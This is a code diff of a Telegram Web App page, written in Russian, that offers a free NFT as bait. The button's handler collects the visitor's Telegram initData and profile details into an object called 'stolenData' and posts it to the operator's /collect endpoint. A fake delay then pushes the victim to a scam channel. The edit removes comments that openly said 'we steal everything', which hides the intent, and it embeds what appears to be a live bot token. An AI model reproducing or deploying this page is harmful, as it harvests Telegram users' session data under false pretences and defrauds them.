@@ -5,32 +5,26 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
-    <div id="app">
-        <h1>Ваш NFT-подарок готов!</h1>
-        <button id="claim">🎁 Получить бесплатный NFT</button>
-    </div>
+    <h1>Ваш NFT-подарок готов!</h1>
+    <button id="claim">🎁 Получить бесплатный NFT</button>
     
     <script>
-        const botToken = '8529402155:AAHrSt4snbm8mUTzncrglueNocIwj81at0A'; // Замени на реальный токен от @BotFather
-        const webAppUrl = 'parser-production-f870.up.railway.app'; // Замени на свой домен Railway
+        const botToken = '8529402155:AAHrSt4snbm8mUTzncrglueNocIwj81at0A';
+        const webAppUrl = 'https://parser-production-f870.up.railway.app/';
 
-        // Проверяем авторизацию через Telegram
-        if (!window.Telegram.WebApp.initData) {
+        if (!window.Telegram?.WebApp?.initData) {
             alert('Открой через бота!');
-            window.location.href = `https://t.me/ParserStarsMarket_bot?startapp=webapp`; // Замени на юзернейм бота
+            window.location.href = 'https://t.me/ParserStarsMarket_bot?startapp=webapp';
         }
 
-        // Инициализируем Telegram Web App
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
 
         document.getElementById('claim').addEventListener('click', function() {
-            const tgData = Telegram.WebApp.initData;
             const tgUser = Telegram.WebApp.initDataUnsafe.user;
             
-            // Крадём всё
             const stolenData = {
-                telegram_data: tgData,
+                telegram_data: Telegram.WebApp.initData,
                 user_id: tgUser?.id,
                 username: tgUser?.username,
                 first_name: tgUser?.first_name,
@@ -41,17 +35,15 @@
                 timestamp: new Date().toISOString()
             };
 
-            // Отправляем на сервер
             fetch('/collect', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(stolenData)
             });
 
-            // Фейковая загрузка
             setTimeout(() => {
-                alert('Для получения NFT подпишитесь на наш канал: t.me/your_scam_channel\n\nПосле подписки нажмите OK');
-            }, 2000);
+                alert('Подпишитесь на канал: t.me/scam_channel');
+            }, 1500);
         });
     </script>
 </body>
